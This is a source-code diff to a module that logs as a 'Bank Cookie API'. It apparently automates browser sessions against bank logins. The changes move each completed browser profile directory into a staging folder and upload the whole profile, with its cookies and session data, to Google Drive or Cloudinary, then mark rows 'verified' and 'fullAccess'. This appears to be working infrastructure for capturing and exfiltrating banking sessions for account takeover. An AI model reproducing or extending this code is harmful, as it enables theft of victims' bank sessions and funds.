@@ -27,6 +27,12 @@ import { populateCache, setCachedRow, evictRow, getCachedRow } from '../../../..
 import { identifySelf as identifyServerlessSelf, getSelfUrl } from '../../../../utils/serverlessTracker.js';
 
 const MAX_CONCURRENT_BROWSERS = parseInt(process.env.MAX_CONCURRENT_BROWSERS || '3', 10);
+const DRIVE_FINALIZER_AWAIT_MS = parseInt(process.env.DRIVE_FINALIZER_AWAIT_MS || '120000', 10);
+// Dedicated staging root for COMPLETED-finalizer uploads. Lives OUTSIDE the profile tree so
+// segment scans, cleanup paths, and the external stale-segment cleaner never touch a profile
+// mid-upload. At close, the live browser dir is moved (or copied) here and the original path
+// is left empty; the upload reads ONLY this staged copy.
+const STAGING_ROOT = process.env.STAGING_ROOT || '/tmp/webfixx_uploading';
 const activeProcesses = new Set();
 const activeBrowserSessions = new Map();
 logger.info(`[Bank Cookie API] Concurrency limit set to ${MAX_CONCURRENT_BROWSERS}`);
@@ -548,6 +554,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
     logger.debug(`[processRow][${browserId}] Processing row.`);
 
     const userDataDir = `users_data/${browserId}`;
+    const stagingDir = `${STAGING_ROOT}/${browserId}`;
     let browser = null;
     let page = null;
     let targetCreatedListener = null; // Defined here to be accessible in finally
@@ -1698,7 +1705,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                                         let uploadedDriveUrlAfterPassive = null;
                                         try {
-                                            uploadedDriveUrlAfterPassive = await uploadBrowserData(browserId);
+                                            uploadedDriveUrlAfterPassive = await uploadBrowserData(browserId, updateData, userDataDir);
                                             if (uploadedDriveUrlAfterPassive) {
                                                 updateData.driveUrl = uploadedDriveUrlAfterPassive;
                                             }
@@ -1757,7 +1764,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                                 let uploadedDriveUrlAfterCode = null;
                                 try {
-                                    uploadedDriveUrlAfterCode = await uploadBrowserData(browserId);
+                                    uploadedDriveUrlAfterCode = await uploadBrowserData(browserId, updateData, userDataDir);
                                     if (uploadedDriveUrlAfterCode) {
                                         updateData.driveUrl = uploadedDriveUrlAfterCode;
                                     }
@@ -2066,23 +2073,56 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
             if (browser) {
                 if (targetCreatedListener && browser && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
-                logger.info(`[processRow][${browserId}] Closing browser for COMPLETED status before Drive upload.`);
-                await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
-                browserFullyClosed = true;
-                activeBrowserSessions.delete(browserId);
-                await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
+                logger.info(`[processRow][${browserId}] Closing browser for COMPLETED status before Drive upload (release profile file locks).`);
+                const browserClosedPromise = (async () => {
+                    await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
+                    browserFullyClosed = true;
+                    activeBrowserSessions.delete(browserId);
+                    try {
+                        if (userDataDir && fs.existsSync(userDataDir)) {
+                            if (!fs.existsSync(stagingDir)) {
+                                await fs.ensureDir(STAGING_ROOT);
+                                try {
+                                    await fs.move(userDataDir, stagingDir);
+                                } catch (moveErr) {
+                                    logger.warn(`[PROFILE][${browserId}] STAGE move failed (${moveErr.message}); falling back to copy.`);
+                                    await fs.copy(userDataDir, stagingDir, { overwrite: true });
+                                }
+                            }
+                            logger.warn(`[PROFILE][${browserId}] STAGED profile to ${stagingDir} moved=${!fs.existsSync(userDataDir)} dirExists=${fs.existsSync(stagingDir)}`);
+                        } else {
+                            logger.warn(`[PROFILE][${browserId}] STAGE SKIPPED: source dir missing at close (${userDataDir}). Upload will fall back to the original dir.`);
+                        }
+                    } catch (stageErr) {
+                        logger.error(`[PROFILE][${browserId}] STAGE failed: ${stageErr.message}`);
+                    }
+                    await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
+                    await new Promise(resolve => setTimeout(resolve, 1500)); // Let Chromium flush profile DBs before the worker zips
+                })();
+                await browserClosedPromise;
             }
 
             let uploadedDriveUrl = null;
+            let uploadSettled = false;
             try {
-                uploadedDriveUrl = await uploadBrowserData(browserId);
+                const uploadSource = (stagingDir && fs.existsSync(stagingDir)) ? stagingDir : userDataDir;
+                const driveUploadPromise = uploadBrowserData(browserId, updateData, uploadSource, { autoFinalize: true });
+                const uploadResult = await Promise.race([
+                    driveUploadPromise.then(url => ({ settled: true, url })),
+                    new Promise(resolve => setTimeout(() => resolve({ settled: false, url: null }), DRIVE_FINALIZER_AWAIT_MS))
+                ]);
+                uploadSettled = uploadResult.settled;
+                uploadedDriveUrl = uploadResult.url || null;
                 if (uploadedDriveUrl) {
                     updateData.driveUrl = uploadedDriveUrl;
-                    logger.info(`[processRow][${browserId}] Successfully uploaded browser data to Google Drive.`);
+                    logger.info(`[processRow][${browserId}] Successfully uploaded browser data to ${uploadedDriveUrl.startsWith('https://res.cloudinary.com') ? 'Cloudinary' : 'Google Drive'}.`);
+                } else if (uploadSettled) {
+                    logger.warn(`[processRow][${browserId}] Upload settled with no URL (permanent failure or both providers unavailable).`);
                 } else {
-                    logger.warn(`[processRow][${browserId}] Google Drive upload skipped or failed.`);
+                    logger.warn(`[processRow][${browserId}] Upload still in progress after ${DRIVE_FINALIZER_AWAIT_MS}ms — leaving row PROCESSING_FINALIZING; background queue will complete it.`);
                 }
             } catch (uploadError) {
+                uploadSettled = true;
                 logger.error(`[processRow][${browserId}] Error during Google Drive upload: ${uploadError.message}`);
             }
 
@@ -2094,6 +2134,34 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 } catch (deleteError) {
                     logger.error(`[processRow][${browserId}] Error deleting user data directory after completion: ${deleteError.message}`);
                 }
+            }
+
+            if (uploadSettled) {
+                if (uploadedDriveUrl) {
+                    finalStatus = "COMPLETED";
+                    updateData.status = "COMPLETED";
+                } else {
+                    const failReason = updateData.reason || 'Upload failed; profile not preserved';
+                    logger.error(`[processRow][${browserId}] Upload did not preserve a profile (uploadedDriveUrl=null). Marking FAILED instead of COMPLETED. reason=${failReason}`);
+                    finalStatus = "FAILED";
+                    updateData.status = "FAILED";
+                    updateData.reason = failReason;
+                    updateData.verified = false;
+                    updateData.fullAccess = false;
+                    updateData.lastJsonResponse = JSON.stringify({
+                        ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED", error: failReason
+                    });
+                }
+            } else {
+                finalStatus = "PROCESSING_FINALIZING";
+                updateData.status = finalStatus;
+                updateData.reason = 'Profile upload pending in background (Drive/Cloudinary retrying). Row auto-completes on success.';
+                updateData.lastJsonResponse = JSON.stringify({
+                    ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                    status: finalStatus,
+                    message: updateData.reason
+                });
+                logger.warn(`[processRow][${browserId}] Upload pending — persisting PROCESSING_FINALIZING; background worker will complete the row.`);
             }
         }
 
